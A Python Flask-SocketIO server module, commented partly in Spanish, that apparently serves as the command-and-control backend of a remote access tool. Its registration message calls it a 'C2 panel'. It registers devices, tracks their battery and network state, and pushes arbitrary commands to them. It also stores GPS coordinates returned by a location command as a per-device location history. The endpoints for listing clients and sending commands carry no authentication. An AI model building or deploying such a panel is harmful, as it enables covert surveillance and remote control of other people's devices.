# remote_control_handler.py - Improved remote control request handling

import os
import json
import datetime
import logging
import threading
from flask import jsonify, request
from flask_socketio import emit

# Logging Setup
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(name)s - %(levelname)s - %(message)s"
)
logger = logging.getLogger("RemoteControlHandler")


class RemoteControlHandler:
    """
    Handles remote control requests with improved responsiveness and error handling
    """

    def __init__(self, socketio, connected_clients_sio, data_received_dir):
        """
        Initialize the remote control handler

        Args:
            socketio: SocketIO instance
            connected_clients_sio: Dictionary of connected clients
            data_received_dir: Directory for received data
        """
        self.socketio = socketio
        self.connected_clients_sio = connected_clients_sio
        self.data_received_dir = data_received_dir
        self.command_queue = {}  # Queue for tracking command status
        self.command_timeout = 30  # Default timeout in seconds

    def register_handlers(self):
        """
        Register SocketIO event handlers for remote control
        """

        @self.socketio.on("connect")
        def handle_sio_connect():
            client_sid = request.sid
            logger.info(
                f"Client attempting to connect: SID={client_sid}, IP={request.remote_addr}"
            )
            # Send immediate acknowledgment to improve responsiveness
            emit(
                "connection_acknowledged",
                {"status": "connected", "sid": client_sid},
                room=client_sid,
            )

        @self.socketio.on("disconnect")
        def handle_sio_disconnect():
            client_sid = request.sid
            if client_sid in self.connected_clients_sio:
                device_info = self.connected_clients_sio.pop(client_sid)
                dev_id_display = device_info.get("id", client_sid)
                logger.info(
                    f"Device '{dev_id_display}' disconnected (SID={client_sid}, IP={device_info.get('ip','N/A')})."
                )
                # Notify all admin clients about disconnection for real-time updates
                self.socketio.emit(
                    "client_disconnected",
                    {"device_id": dev_id_display, "sid": client_sid},
                )
            else:
                logger.warning(
                    f"Unknown client disconnected: SID={client_sid}, IP={request.remote_addr}."
                )

        @self.socketio.on("register_device")
        def handle_register_device(data):
            client_sid = request.sid
            try:
                device_identifier = data.get("deviceId", None)
                device_name_display = data.get("deviceName", f"Device_{client_sid[:6]}")
                device_platform = data.get("platform", "Unknown")

                if not device_identifier:
                    logger.error(
                        f"Registration failed for SID {client_sid}: 'deviceId' missing. Data: {data}"
                    )
                    emit(
                        "registration_failed",
                        {"message": "Missing 'deviceId' in registration payload."},
                        room=client_sid,
                    )
                    return

                # Store more detailed device information for better management
                self.connected_clients_sio[client_sid] = {
                    "sid": client_sid,
                    "id": device_identifier,
                    "name_display": device_name_display,
                    "platform": device_platform,
                    "ip": request.remote_addr,
                    "connected_at": datetime.datetime.now().isoformat(),
                    "last_seen": datetime.datetime.now().isoformat(),
                    "status": "active",
                    "commands_sent": 0,
                    "commands_succeeded": 0,
                    "commands_failed": 0,
                }

                logger.info(
                    f"Device registered: ID='{device_identifier}', Name='{device_name_display}', SID={client_sid}, IP={request.remote_addr}"
                )

                # Send successful registration acknowledgment
                emit(
                    "registration_successful",
                    {
                        "message": "Successfully registered with C2 panel.",
                        "sid": client_sid,
                        "timestamp": datetime.datetime.now().isoformat(),
                    },
                    room=client_sid,
                )

                # Notify all admin clients about new connection for real-time updates
                self.socketio.emit(
                    "client_connected",
                    {
                        "device_id": device_identifier,
                        "device_name": device_name_display,
                        "platform": device_platform,
                        "sid": client_sid,
                    },
                )

            except Exception as e:
                logger.error(
                    f"Error in handle_register_device for SID {client_sid}: {e}",
                    exc_info=True,
                )
                emit(
                    "registration_failed",
                    {"message": f"Server error during registration: {e}"},
                    room=client_sid,
                )

        @self.socketio.on("device_heartbeat")
        def handle_device_heartbeat(data):
            client_sid = request.sid
            if client_sid in self.connected_clients_sio:
                # Update last seen timestamp and other status information
                self.connected_clients_sio[client_sid][
                    "last_seen"
                ] = datetime.datetime.now().isoformat()

                # Update additional status information if provided
                if isinstance(data, dict):
                    if "status" in data:
                        self.connected_clients_sio[client_sid]["status"] = data[
                            "status"
                        ]
                    if "battery" in data:
                        self.connected_clients_sio[client_sid]["battery"] = data[
                            "battery"
                        ]
                    if "network" in data:
                        self.connected_clients_sio[client_sid]["network"] = data[
                            "network"
                        ]

                # Send heartbeat acknowledgment for better client synchronization
                emit(
                    "heartbeat_ack",
                    {"timestamp": datetime.datetime.now().isoformat()},
                    room=client_sid,
                )

                # Notify admin clients about updated status
                self.socketio.emit(
                    "client_status_update",
                    {
                        "sid": client_sid,
                        "device_id": self.connected_clients_sio[client_sid]["id"],
                        "last_seen": self.connected_clients_sio[client_sid][
                            "last_seen"
                        ],
                        "status": self.connected_clients_sio[client_sid].get(
                            "status", "active"
                        ),
                    },
                )
            else:
                logger.warning(
                    f"Heartbeat from unknown/unregistered SID: {client_sid}. Data: {data}. Requesting registration."
                )
                emit("request_registration_info", {}, room=client_sid)

        @self.socketio.on("command_response")
        def handle_command_response(data):
            client_sid = request.sid
            device_info = self.connected_clients_sio.get(client_sid)
            device_id_str = (
                device_info["id"]
                if device_info and "id" in device_info
                else f"SID_{client_sid}"
            )
            command_name = data.get("command", "unknown_command")
            command_id = data.get("command_id", None)
            status = data.get("status", "unknown")
            payload = data.get("payload", {})

            # Procesar enlaces especiales para ubicación
            if command_name == "command_get_location" and status == "success":
                # Añadir enlaces para mostrar en el mapa
                if "latitude" in payload and "longitude" in payload:
                    lat = payload["latitude"]
                    lng = payload["longitude"]
                    payload["maps_url"] = f"https://www.google.com/maps?q={lat},{lng}"
                    payload["html_link"] = (
                        f"<a href='https://www.google.com/maps?q={lat},{lng}' target='_blank'>Ver en Google Maps</a>"
                    )

                    # Guardar la ubicación en la base de datos
                    self._save_location_to_db(
                        device_id_str,
                        lat,
                        lng,
                        payload.get("accuracy", 0),
                        payload.get(
                            "timestamp_gps", datetime.datetime.now().isoformat()
                        ),
                    )

            logger.info(
                f"Response for '{command_name}' (ID: {command_id}) from '{device_id_str}'. Status: {status}."
            )

            # Update command statistics
            if device_info:
                if status == "success":
                    device_info["commands_succeeded"] = (
                        device_info.get("commands_succeeded", 0) + 1
                    )
                elif status in ["error", "failed"]:
                    device_info["commands_failed"] = (
                        device_info.get("commands_failed", 0) + 1
                    )

            # Clear command from queue if it exists
            if command_id and command_id in self.command_queue:
                self.command_queue.pop(command_id)

            # Forward response to admin clients
            self.socketio.emit(
                "command_result",
                {
                    "device_id": device_id_str,
                    "command": command_name,
                    "command_id": command_id,
                    "status": status,
                    "payload": payload,
                    "timestamp": datetime.datetime.now().isoformat(),
                },
            )

    def _save_location_to_db(self, device_id, latitude, longitude, accuracy, timestamp):
        """
        Guardar datos de ubicación del dispositivo en la base de datos
        """
        try:
            # Crear directorio para el dispositivo si no existe
            device_dir = os.path.join(self.data_received_dir, device_id)
            os.makedirs(device_dir, exist_ok=True)

            # Construir datos de ubicación con timestamp
            location_data = {
                "latitude": latitude,
                "longitude": longitude,
                "accuracy": accuracy,
                "timestamp": timestamp,
                "recorded_at": datetime.datetime.now().isoformat(),
            }

            # Guardar en archivo de historial de ubicaciones
            locations_file = os.path.join(device_dir, "location_history.json")

            existing_data = []
            if os.path.exists(locations_file):
                try:
                    with open(locations_file, "r") as f:
                        existing_data = json.load(f)
                except json.JSONDecodeError:
                    # Si el archivo está corrupto, empezamos con lista vacía
                    existing_data = []

            # Añadir nueva ubicación
            existing_data.append(location_data)

            # Guardar archivo actualizado
            with open(locations_file, "w") as f:
                json.dump(existing_data, f, indent=2)

            logger.info(f"Location saved for device {device_id}")
        except Exception as e:
            logger.error(f"Error saving location for device {device_id}: {e}")

    def send_command_to_client(self, target_sid, command_name, args=None, timeout=None):
        """
        Send command to client with improved tracking and timeout handling

        Args:
            target_sid: Target client session ID
            command_name: Command name to send
            args: Command arguments (default: {})
            timeout: Command timeout in seconds (default: self.command_timeout)

        Returns:
            dict: Command status information
        """
        if args is None:
            args = {}

        if timeout is None:
            timeout = self.command_timeout

        if target_sid in self.connected_clients_sio:
            client_info = self.connected_clients_sio[target_sid]

            # Generate unique command ID for tracking
            command_id = (
                f"{command_name}_{datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')}"
            )

            # Add command to tracking queue
            self.command_queue[command_id] = {
                "command": command_name,
                "args": args,
                "target_sid": target_sid,
                "device_id": client_info["id"],
                "sent_at": datetime.datetime.now().isoformat(),
                "status": "pending",
                "timeout": timeout,
            }

            # Update command count
            client_info["commands_sent"] = client_info.get("commands_sent", 0) + 1

            # Create the command payload with all necessary information
            command_payload = {
                "command": command_name,
                "command_id": command_id,
                "args": args,
            }

            logger.info(
                f"Sending command '{command_name}' (ID: {command_id}) to device ID '{client_info['id']}' (SID: {target_sid})"
            )

            # CAMBIO IMPORTANTE: Enviar todos los comandos a través del evento 'command' genérico
            self.socketio.emit("command", command_payload, to=target_sid)

            # Start timeout monitoring in background thread
            threading.Thread(
                target=self._monitor_command_timeout,
                args=(command_id, timeout),
                daemon=True,
            ).start()

            # Notify admin clients about command dispatch
            self.socketio.emit(
                "command_sent",
                {
                    "command_id": command_id,
                    "command": command_name,
                    "device_id": client_info["id"],
                    "timestamp": datetime.datetime.now().isoformat(),
                },
            )

            return {
                "status": "sent",
                "command_id": command_id,
                "message": f"Command '{command_name}' sent to device '{client_info['id']}'.",
            }
        else:
            errmsg = f"Target SID {target_sid} not found for command '{command_name}'."
            logger.error(errmsg)

            return {"status": "error", "message": errmsg}

    def _monitor_command_timeout(self, command_id, timeout):
        """
        Monitor command execution and handle timeouts

        Args:
            command_id: Command ID to monitor
            timeout: Timeout in seconds
        """
        # Wait for timeout period
        threading.Event().wait(timeout)

        # Check if command is still in queue (not completed)
        if command_id in self.command_queue:
            command_info = self.command_queue.pop(command_id)
            target_sid = command_info["target_sid"]
            device_id = command_info["device_id"]
            command_name = command_info["command"]

            logger.warning(
                f"Command '{command_name}' (ID: {command_id}) to device '{device_id}' timed out after {timeout} seconds."
            )

            # Update device statistics if device is still connected
            if target_sid in self.connected_clients_sio:
                client_info = self.connected_clients_sio[target_sid]
                client_info["commands_failed"] = (
                    client_info.get("commands_failed", 0) + 1
                )

            # Notify admin clients about timeout
            self.socketio.emit(
                "command_timeout",
                {
                    "command_id": command_id,
                    "command": command_name,
                    "device_id": device_id,
                    "timeout": timeout,
                    "timestamp": datetime.datetime.now().isoformat(),
                },
            )

    def get_active_clients(self):
        """
        Get list of active clients with enhanced status information

        Returns:
            list: List of active client information
        """
        active_clients = []
        current_time = datetime.datetime.now()

        for sid, client in self.connected_clients_sio.items():
            try:
                # Parse last seen timestamp
                last_seen = datetime.datetime.fromisoformat(client["last_seen"])

                # Calculate time since last heartbeat
                time_since_last_seen = (current_time - last_seen).total_seconds()

                # Determine client status based on heartbeat
                if time_since_last_seen < 60:  # Less than 1 minute
                    status = "active"
                elif time_since_last_seen < 300:  # Less than 5 minutes
                    status = "idle"
                else:
                    status = "stale"

                # Update client status
                client["status"] = status

                # Add client to active list with enhanced information
                active_clients.append(
                    {
                        "sid": sid,
                        "id": client["id"],
                        "name": client["name_display"],
                        "platform": client.get("platform", "Unknown"),
                        "ip": client.get("ip", "Unknown"),
                        "connected_at": client["connected_at"],
                        "last_seen": client["last_seen"],
                        "status": status,
                        "time_since_last_seen": int(time_since_last_seen),
                        "commands_sent": client.get("commands_sent", 0),
                        "commands_succeeded": client.get("commands_succeeded", 0),
                        "commands_failed": client.get("commands_failed", 0),
                        "battery": client.get("battery", None),
                        "network": client.get("network", None),
                    }
                )
            except Exception as e:
                logger.error(f"Error processing client {sid}: {e}", exc_info=True)

        # Sort by status (active first) then by last seen time
        active_clients.sort(
            key=lambda c: (
                0 if c["status"] == "active" else (1 if c["status"] == "idle" else 2),
                c["time_since_last_seen"],
            )
        )

        return active_clients


def register_remote_control_routes(app, remote_control_handler):
    """
    Register HTTP routes for remote control functionality

    Args:
        app: Flask application instance
        remote_control_handler: RemoteControlHandler instance
    """

    @app.route("/api/clients", methods=["GET"])
    def get_active_clients():
        """
        Get list of active clients
        """
        try:
            active_clients = remote_control_handler.get_active_clients()
            return (
                jsonify(
                    {
                        "status": "success",
                        "clients": active_clients,
                        "count": len(active_clients),
                    }
                ),
                200,
            )
        except Exception as e:
            logger.error(f"Error in get_active_clients: {e}", exc_info=True)
            return (
                jsonify({"status": "error", "message": f"Server error: {str(e)}"}),
                500,
            )

    @app.route("/api/clients/<sid>/command", methods=["POST"])
    def send_command(sid):
        """
        Send command to client
        """
        try:
            data = request.json
            if not data:
                return (
                    jsonify({"status": "error", "message": "Missing request data"}),
                    400,
                )

            command = data.get("command")
            args = data.get("args", {})
            timeout = data.get("timeout", None)

            if not command:
                return (
                    jsonify({"status": "error", "message": "Command name is required"}),
                    400,
                )

            result = remote_control_handler.send_command_to_client(
                sid, command, args, timeout
            )

            if result["status"] == "error":
                return jsonify(result), 404
            else:
                return jsonify(result), 200

        except Exception as e:
            logger.error(f"Error in send_command: {e}", exc_info=True)
            return (
                jsonify({"status": "error", "message": f"Server error: {str(e)}"}),
                500,
            )
